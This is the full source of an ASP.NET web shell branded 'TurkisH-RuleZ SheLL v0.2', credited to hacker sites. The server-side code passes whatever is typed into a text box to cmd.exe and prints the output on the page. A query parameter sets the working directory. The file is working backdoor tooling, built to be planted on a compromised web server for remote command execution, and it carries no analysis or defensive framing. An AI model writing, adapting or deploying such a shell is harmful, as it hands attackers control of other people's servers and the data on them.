<%-- TurkisH-RuleZ SheLL v0.2 - CMD Version --%>
<%--  www.sec4ever.com  | www.sec-t.net --%>
<%@ Page Language="C#" EnableViewState="false" %>
<%@ Import Namespace="System.Web.UI.WebControls" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<%
	string outstr = "";
	
	// Path That wE're iN iT :D
	string dir = Page.MapPath(".") + "/";
	if (Request.QueryString["fdir"] != null)
		dir = Request.QueryString["fdir"] + "/";
	dir = dir.Replace("\\", "/");
	dir = dir.Replace("//", "/");

	// Executing Command'z 
	if (txtCmdIn.Text.Length > 0)
	{
		Process p = new Process();
		p.StartInfo.CreateNoWindow = true;
		p.StartInfo.FileName = "cmd.exe";
		p.StartInfo.Arguments = "/c " + txtCmdIn.Text;
		p.StartInfo.UseShellExecute = false;
		p.StartInfo.RedirectStandardOutput = true;
		p.StartInfo.RedirectStandardError = true;
		p.StartInfo.WorkingDirectory = dir;
		p.Start();

		lblCmdOut.Text = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
		txtCmdIn.Text = "";
	}	
%>



<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<script runat="server">

    protected void cmdUpload_Click(object sender, EventArgs e)
    {

    }

    protected void txtCmdIn_TextChanged(object sender, EventArgs e)
    {

    }
</script>


<html xmlns="http://www.w3.org/1999/xhtml" >
<head>
	<title># TurkisH-RuleZ SheLL</title>
	<style type="text/css">
		* { font-family: Arial; font-size: 12px; }
		body { margin: 0px; }
		pre { font-family: Courier New; background-color: #c7c7c7;  }
		h1 { font-size: 16px; background-color: #000000; color: #ffffff; padding: 5px; }
		h2 { font-size: 14px; background-color: #000000; color: #ffffff; padding: 2px; }
		th { text-align: left; background-color: #000000; }
		td { background-color: #000000; }
		pre { margin: 2px; }
	</style>
</head>
<body bgcolor="#000000">
    <form id="form1" runat="server">
    <div align="left">
		<table border="0" width="100%" id="table1" cellspacing="0" cellpadding="0" bgcolor="#CC8CED">
			<tr>
				<td>
    <table style="width: 100%; border-width: 0px; padding: 5px;" id="table2">
		<tr>
			<td style="width: 50%; vertical-align: top;">
				<h2><font color="#FF0000"># Command  Line Shell Priv8&nbsp;</font></h2>
				<p>
                    					&nbsp;</p>				
				<asp:TextBox runat="server" ID="txtCmdIn" Width="300" OnTextChanged="txtCmdIn_TextChanged" BackColor="Black" BorderColor="Red" ForeColor="White" BorderStyle="Dotted" BorderWidth="1px" />
                &nbsp; &nbsp;<asp:Button runat="server" ID="cmdExec" Text="Execute" BackColor="Black" Font-Bold="True" ForeColor="White" BorderColor="Red" BorderStyle="Dotted" BorderWidth="1px" />
				<p>&nbsp;</p>
				<pre><asp:Literal runat="server" ID="lblCmdOut" Mode="Encode" /></pre>
			</td>
		</tr>
    </table>

    <p>&nbsp;</p>


    			</td>
			</tr>
		</table>
	</div>

    </form>
</body>
</html>

<br>
